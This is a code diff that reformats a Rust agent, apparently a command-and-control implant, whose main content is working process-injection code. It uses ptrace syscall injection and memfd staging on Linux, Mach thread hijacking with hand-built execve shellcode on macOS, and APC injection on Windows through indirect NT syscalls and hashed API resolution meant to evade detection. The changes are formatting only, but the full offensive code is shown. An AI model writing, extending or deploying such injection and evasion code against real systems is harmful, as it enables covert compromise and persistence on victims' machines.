@@ -45,9 +45,15 @@ const HASH_THREAD32NEXT: u32 = hash_str_const(b"Thread32Next\0");
 #[cfg(windows)]
 type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void;
 #[cfg(windows)]
-type FnThread32First = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+type FnThread32First = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut winapi::um::tlhelp32::THREADENTRY32,
+) -> i32;
 #[cfg(windows)]
-type FnThread32Next = unsafe extern "system" fn(*mut std::ffi::c_void, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+type FnThread32Next = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut winapi::um::tlhelp32::THREADENTRY32,
+) -> i32;
 
 // Windows-only process hollowing now lives in the shared `hollowing` crate.
 
@@ -171,10 +177,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             let agent_path = std::env::current_exe()
                 .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
             let agent_binary = std::fs::read(&agent_path).map_err(|e| {
-                anyhow::anyhow!(
-                    "failed to read agent binary {}: {e}",
-                    agent_path.display()
-                )
+                anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
             })?;
             tracing::info!(
                 "read agent binary ({} bytes) for memfd migration to pid {}",
@@ -225,12 +228,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                         0usize,
                         &sc_regs as *const _ as usize,
                     );
-                    libc::ptrace(
-                        libc::PTRACE_CONT,
-                        target_pid as libc::pid_t,
-                        0usize,
-                        0usize,
-                    );
+                    libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
                     libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
                     let mut result_regs: libc::user_regs_struct =
                         MaybeUninit::zeroed().assume_init();
@@ -276,9 +274,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     0,          // offset
                 )?;
                 if remote_buf == u64::MAX || remote_buf == 0 {
-                    detach_and_bail(format!(
-                        "remote mmap failed (returned {remote_buf:#x})"
-                    ))?;
+                    detach_and_bail(format!("remote mmap failed (returned {remote_buf:#x})"))?;
                     unreachable!()
                 }
 
@@ -350,9 +346,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 )?;
                 let memfd_fd = memfd_fd as i32;
                 if memfd_fd < 0 {
-                    detach_and_bail(format!(
-                        "remote memfd_create failed (returned {memfd_fd})"
-                    ))?;
+                    detach_and_bail(format!("remote memfd_create failed (returned {memfd_fd})"))?;
                     unreachable!()
                 }
 
@@ -360,9 +354,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 const SYS_WRITE: u64 = 1;
                 let write_result = run_syscall(
                     SYS_WRITE,
-                    memfd_fd as u64,            // fd
-                    remote_buf,                 // buf (agent binary)
-                    agent_binary.len() as u64,  // count
+                    memfd_fd as u64,           // fd
+                    remote_buf,                // buf (agent binary)
+                    agent_binary.len() as u64, // count
                     0,
                     0,
                     0,
@@ -409,15 +403,8 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 // ── Stage 4.5: Transition mapped pages from RW to RX via mprotect ──
                 const SYS_MPROTECT: u64 = 10;
                 const PROT_RX: u64 = 5; // PROT_READ|PROT_EXEC
-                let mprot_result = run_syscall(
-                    SYS_MPROTECT,
-                    remote_buf,
-                    alloc_size,
-                    PROT_RX,
-                    0,
-                    0,
-                    0,
-                )?;
+                let mprot_result =
+                    run_syscall(SYS_MPROTECT, remote_buf, alloc_size, PROT_RX, 0, 0, 0)?;
                 if mprot_result != 0 {
                     detach_and_bail(format!(
                         "remote mprotect failed (returned {:#x})",
@@ -456,12 +443,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     0usize,
                     &clone_regs as *const _ as usize,
                 );
-                libc::ptrace(
-                    libc::PTRACE_CONT,
-                    target_pid as libc::pid_t,
-                    0usize,
-                    0usize,
-                );
+                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
                 libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
 
                 // Restore original bytes and original registers.
@@ -500,7 +482,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     0usize,
                     0usize,
                 );
-                anyhow::bail!("Linux process migration via ptrace+clone is only implemented for x86_64");
+                anyhow::bail!(
+                    "Linux process migration via ptrace+clone is only implemented for x86_64"
+                );
             }
 
             Ok(())
@@ -635,120 +619,116 @@ fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
     anyhow::bail!("build_execve_stub: unsupported architecture")
 }
 
-    #[cfg(target_os = "macos")]
-    #[derive(Debug, Clone, Copy)]
-    enum MacosMigrationStrategy {
-        MemfdExecve,
-        OnDiskExecve,
-    }
+#[cfg(target_os = "macos")]
+#[derive(Debug, Clone, Copy)]
+enum MacosMigrationStrategy {
+    MemfdExecve,
+    OnDiskExecve,
+}
 
-    #[cfg(target_os = "macos")]
-    fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
-        // Prefer memfd on modern macOS, but keep a fallback that executes the
-        // current agent binary path directly when memfd is unavailable.
-        let version = std::process::Command::new("sw_vers")
-            .args(["-productVersion"])
-            .output()
-            .ok()
-            .filter(|o| o.status.success())
-            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
-            .ok_or_else(|| anyhow::anyhow!(
-                "unable to determine macOS version via sw_vers"
-            ))?;
+#[cfg(target_os = "macos")]
+fn detect_macos_migration_strategy() -> Result<MacosMigrationStrategy> {
+    // Prefer memfd on modern macOS, but keep a fallback that executes the
+    // current agent binary path directly when memfd is unavailable.
+    let version = std::process::Command::new("sw_vers")
+        .args(["-productVersion"])
+        .output()
+        .ok()
+        .filter(|o| o.status.success())
+        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
+        .ok_or_else(|| anyhow::anyhow!("unable to determine macOS version via sw_vers"))?;
 
-        let major = version
-            .split('.')
-            .next()
-            .and_then(|s| s.parse::<u32>().ok())
-            .ok_or_else(|| anyhow::anyhow!(
-                "unable to parse macOS version '{version}'"
-            ))?;
+    let major = version
+        .split('.')
+        .next()
+        .and_then(|s| s.parse::<u32>().ok())
+        .ok_or_else(|| anyhow::anyhow!("unable to parse macOS version '{version}'"))?;
 
-        if major >= 13 {
-            Ok(MacosMigrationStrategy::MemfdExecve)
-        } else {
-            tracing::warn!(
+    if major >= 13 {
+        Ok(MacosMigrationStrategy::MemfdExecve)
+    } else {
+        tracing::warn!(
                 "macOS {version} does not provide memfd migration support; using on-disk execve fallback"
             );
-            Ok(MacosMigrationStrategy::OnDiskExecve)
-        }
+        Ok(MacosMigrationStrategy::OnDiskExecve)
     }
+}
 
-    #[cfg(target_os = "macos")]
-    fn read_macos_process_command(pid: u32) -> Option<String> {
-        let output = std::process::Command::new("ps")
-            .args(["-p", &pid.to_string(), "-o", "command="])
-            .output()
-            .ok()?;
-        if !output.status.success() {
-            return None;
-        }
-        let cmd = String::from_utf8_lossy(&output.stdout).trim().to_string();
-        if cmd.is_empty() {
-            None
-        } else {
-            Some(cmd)
-        }
+#[cfg(target_os = "macos")]
+fn read_macos_process_command(pid: u32) -> Option<String> {
+    let output = std::process::Command::new("ps")
+        .args(["-p", &pid.to_string(), "-o", "command="])
+        .output()
+        .ok()?;
+    if !output.status.success() {
+        return None;
     }
-
-    #[cfg(target_os = "macos")]
-    fn is_macos_process_alive(pid: u32) -> bool {
-        let rc = unsafe { libc::kill(pid as libc::pid_t, 0) };
-        if rc == 0 {
-            return true;
-        }
-        std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
+    let cmd = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    if cmd.is_empty() {
+        None
+    } else {
+        Some(cmd)
     }
+}
 
-    #[cfg(target_os = "macos")]
-    fn wait_for_macos_exec_takeover(
-        target_pid: u32,
-        baseline_cmd: &str,
-        expected_cmd_marker: Option<&str>,
-    ) -> Result<()> {
-        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
-        while std::time::Instant::now() < deadline {
-            if !is_macos_process_alive(target_pid) {
-                anyhow::bail!(
-                    "migration target pid={} exited before stager execution could be confirmed",
-                    target_pid
-                );
-            }
+#[cfg(target_os = "macos")]
+fn is_macos_process_alive(pid: u32) -> bool {
+    let rc = unsafe { libc::kill(pid as libc::pid_t, 0) };
+    if rc == 0 {
+        return true;
+    }
+    std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
+}
 
-            if let Some(cmd) = read_macos_process_command(target_pid) {
-                if let Some(marker) = expected_cmd_marker {
-                    if cmd.contains(marker) {
-                        return Ok(());
-                    }
-                    if cmd != baseline_cmd {
-                        tracing::debug!(
+#[cfg(target_os = "macos")]
+fn wait_for_macos_exec_takeover(
+    target_pid: u32,
+    baseline_cmd: &str,
+    expected_cmd_marker: Option<&str>,
+) -> Result<()> {
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
+    while std::time::Instant::now() < deadline {
+        if !is_macos_process_alive(target_pid) {
+            anyhow::bail!(
+                "migration target pid={} exited before stager execution could be confirmed",
+                target_pid
+            );
+        }
+
+        if let Some(cmd) = read_macos_process_command(target_pid) {
+            if let Some(marker) = expected_cmd_marker {
+                if cmd.contains(marker) {
+                    return Ok(());
+                }
+                if cmd != baseline_cmd {
+                    tracing::debug!(
                             target_pid,
                             marker,
                             "migration verification: command changed but expected marker not present yet: '{}'",
                             cmd
                         );
-                    }
-                } else if cmd != baseline_cmd {
-                    return Ok(());
                 }
+            } else if cmd != baseline_cmd {
+                return Ok(());
             }
-
-            std::thread::sleep(std::time::Duration::from_millis(100));
         }
 
-        if let Some(marker) = expected_cmd_marker {
-            anyhow::bail!(
+        std::thread::sleep(std::time::Duration::from_millis(100));
+    }
+
+    if let Some(marker) = expected_cmd_marker {
+        anyhow::bail!(
                 "migration thread launched for pid={}, but exec takeover marker '{}' was not observed within timeout",
                 target_pid,
                 marker
             )
-        } else {
-            anyhow::bail!(
+    } else {
+        anyhow::bail!(
                 "migration thread launched for pid={}, but command-line takeover could not be verified within timeout",
                 target_pid
             )
-        }
     }
+}
 
 #[cfg(target_os = "macos")]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
@@ -909,9 +889,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             // 1. Build the selected exec stager.
             let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
                 MacosMigrationStrategy::MemfdExecve => {
-                    let agent_binary = agent_binary
-                        .as_ref()
-                        .ok_or_else(|| anyhow::anyhow!("missing agent binary for memfd migration"))?;
+                    let agent_binary = agent_binary.as_ref().ok_or_else(|| {
+                        anyhow::anyhow!("missing agent binary for memfd migration")
+                    })?;
 
                     let mut binary_addr: mach_vm_address_t = 0;
                     let kr = mach_vm_allocate(
@@ -1014,11 +994,8 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             if kr != KERN_SUCCESS {
                 anyhow::bail!("thread_create_running failed: kern_return={kr}");
             }
-            let verify_result = wait_for_macos_exec_takeover(
-                target_pid,
-                &baseline_cmd,
-                verify_marker.as_deref(),
-            );
+            let verify_result =
+                wait_for_macos_exec_takeover(target_pid, &baseline_cmd, verify_marker.as_deref());
             mach_port_deallocate(mach_task_self(), new_thread);
             verify_result?;
             tracing::info!(
@@ -1067,9 +1044,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             // 1. Build the selected exec stager.
             let (shellcode, verify_marker): (Vec<u8>, Option<String>) = match strategy {
                 MacosMigrationStrategy::MemfdExecve => {
-                    let agent_binary = agent_binary
-                        .as_ref()
-                        .ok_or_else(|| anyhow::anyhow!("missing agent binary for memfd migration"))?;
+                    let agent_binary = agent_binary.as_ref().ok_or_else(|| {
+                        anyhow::anyhow!("missing agent binary for memfd migration")
+                    })?;
 
                     let mut binary_addr: mach_vm_address_t = 0;
                     let kr = mach_vm_allocate(
@@ -1170,11 +1147,8 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             if kr != KERN_SUCCESS {
                 anyhow::bail!("thread_create_running(arm64) failed: kern_return={kr}");
             }
-            let verify_result = wait_for_macos_exec_takeover(
-                target_pid,
-                &baseline_cmd,
-                verify_marker.as_deref(),
-            );
+            let verify_result =
+                wait_for_macos_exec_takeover(target_pid, &baseline_cmd, verify_marker.as_deref());
             mach_port_deallocate(mach_task_self(), new_thread);
             verify_result?;
             tracing::info!(
@@ -1246,7 +1220,7 @@ fn build_macos_execve_path_stub_x86_64(path_bytes: &[u8]) -> Vec<u8> {
     // call + pop to get RIP-relative pointer to the appended path string.
     let mut code: Vec<u8> = vec![
         0xE8, 0x00, 0x00, 0x00, 0x00, // call +0
-        0x5F,                         // pop rdi
+        0x5F, // pop rdi
         0x48, 0x81, 0xC7, 0x00, 0x00, 0x00, 0x00, // add rdi, <path_off>
         0x31, 0xF6, // xor esi, esi
         0x31, 0xD2, // xor edx, edx
@@ -1513,15 +1487,11 @@ fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
         let imm16 = ((val >> shift) & 0xFFFF) as u16;
         if first {
             // movz xd, #imm16, LSL #shift
-            insts.push(
-                0xD2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
-            );
+            insts.push(0xD2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd);
             first = false;
         } else if imm16 != 0 {
             // movk xd, #imm16, LSL #shift
-            insts.push(
-                0xF2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
-            );
+            insts.push(0xF2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd);
         }
     }
     if first {
@@ -1657,9 +1627,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::tlhelp32::{
-        TH32CS_SNAPTHREAD, THREADENTRY32,
-    };
+    use winapi::um::tlhelp32::{TH32CS_SNAPTHREAD, THREADENTRY32};
     use winapi::um::winnt::{
         MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION,
         PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
@@ -1683,7 +1651,8 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         if open_status_code < 0 || hprocess == 0 {
             return Err(anyhow::anyhow!(
                 "apc_inject: NtOpenProcess(pid={}) failed: status={:?}",
-                pid, open_status
+                pid,
+                open_status
             ));
         }
 
@@ -1693,19 +1662,20 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let mut region_size: usize = payload.len();
         let alloc_status = crate::syscall!(
             "NtAllocateVirtualMemory",
-            hprocess as u64,                            // ProcessHandle
-            &mut base_addr as *mut _ as u64,           // BaseAddress (in/out)
-            0u64,                                       // ZeroBits
-            &mut region_size as *mut _ as u64,          // RegionSize (in/out)
-            (MEM_COMMIT | MEM_RESERVE) as u64,          // AllocationType
-            PAGE_READWRITE as u64,                       // Protect
+            hprocess as u64,                   // ProcessHandle
+            &mut base_addr as *mut _ as u64,   // BaseAddress (in/out)
+            0u64,                              // ZeroBits
+            &mut region_size as *mut _ as u64, // RegionSize (in/out)
+            (MEM_COMMIT | MEM_RESERVE) as u64, // AllocationType
+            PAGE_READWRITE as u64,             // Protect
         );
         let alloc_status_code = alloc_status.as_ref().map(|s| *s).unwrap_or(-1);
         if alloc_status_code < 0 || base_addr == 0 {
             let _ = crate::syscall!("NtClose", hprocess as u64);
             return Err(anyhow::anyhow!(
                 "apc_inject: NtAllocateVirtualMemory(pid={}) failed: status={:?}",
-                pid, alloc_status
+                pid,
+                alloc_status
             ));
         }
         let remote_mem = base_addr as *mut std::ffi::c_void;
@@ -1714,18 +1684,19 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let mut bytes_written: usize = 0;
         let write_status = crate::syscall!(
             "NtWriteVirtualMemory",
-            hprocess as u64,                            // ProcessHandle
-            remote_mem as u64,                          // BaseAddress
-            payload.as_ptr() as u64,                   // Buffer
-            payload.len() as u64,                       // NumberOfBytesToWrite
-            &mut bytes_written as *mut _ as u64,        // NumberOfBytesWritten
+            hprocess as u64,                     // ProcessHandle
+            remote_mem as u64,                   // BaseAddress
+            payload.as_ptr() as u64,             // Buffer
+            payload.len() as u64,                // NumberOfBytesToWrite
+            &mut bytes_written as *mut _ as u64, // NumberOfBytesWritten
         );
         let write_status_code = write_status.as_ref().map(|s| *s).unwrap_or(-1);
         if write_status_code < 0 {
             let _ = crate::syscall!("NtClose", hprocess as u64);
             return Err(anyhow::anyhow!(
                 "apc_inject: NtWriteVirtualMemory(pid={}) failed: status={:?}",
-                pid, write_status
+                pid,
+                write_status
             ));
         }
 
@@ -1736,11 +1707,11 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         let mut old_protect: u32 = 0;
         let protect_status = crate::syscall!(
             "NtProtectVirtualMemory",
-            hprocess as u64,                            // ProcessHandle
-            &mut protect_base as *mut _ as u64,         // BaseAddress (in/out)
-            &mut protect_size as *mut _ as u64,         // RegionSize (in/out)
-            PAGE_EXECUTE_READ as u64,                    // NewProtect
-            &mut old_protect as *mut _ as u64,           // OldProtect
+            hprocess as u64,                    // ProcessHandle
+            &mut protect_base as *mut _ as u64, // BaseAddress (in/out)
+            &mut protect_size as *mut _ as u64, // RegionSize (in/out)
+            PAGE_EXECUTE_READ as u64,           // NewProtect
+            &mut old_protect as *mut _ as u64,  // OldProtect
         );
         let protect_status_code = protect_status.as_ref().map(|s| *s).unwrap_or(-1);
         if protect_status_code < 0 {
@@ -1758,10 +1729,8 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         // Resolve kernel32 functions at runtime to avoid IAT entries.
         let create_snapshot: FnCreateToolhelp32Snapshot =
             pm_resolve_api(HASH_CREATETOOLHELP32SNAPSHOT)?;
-        let thread32_first: FnThread32First =
-            pm_resolve_api(HASH_THREAD32FIRST)?;
-        let thread32_next: FnThread32Next =
-            pm_resolve_api(HASH_THREAD32NEXT)?;
+        let thread32_first: FnThread32First = pm_resolve_api(HASH_THREAD32FIRST)?;
+        let thread32_next: FnThread32Next = pm_resolve_api(HASH_THREAD32NEXT)?;
 
         let snapshot = create_snapshot(TH32CS_SNAPTHREAD, 0);
         if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
@@ -1771,9 +1740,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         }
 
         let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
-        let apc_routine_addr = apc_routine
-            .map(|f| f as usize as u64)
-            .unwrap_or(0);
+        let apc_routine_addr = apc_routine.map(|f| f as usize as u64).unwrap_or(0);
         if apc_routine_addr == 0 {
             pe_resolve::close_handle(snapshot);
             return Err(anyhow::anyhow!(
@@ -1788,8 +1755,10 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             loop {
                 if entry.th32OwnerProcessID == pid {
                     // NtOpenThread (indirect syscall, no IAT entry).
-                    let mut obj_attr_thread: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                    obj_attr_thread.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                    let mut obj_attr_thread: winapi::shared::ntdef::OBJECT_ATTRIBUTES =
+                        std::mem::zeroed();
+                    obj_attr_thread.Length =
+                        std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid_thread: u64 = entry.th32ThreadID as u64;
                     let mut hthread: usize = 0;
                     let nt_open = crate::syscall!(
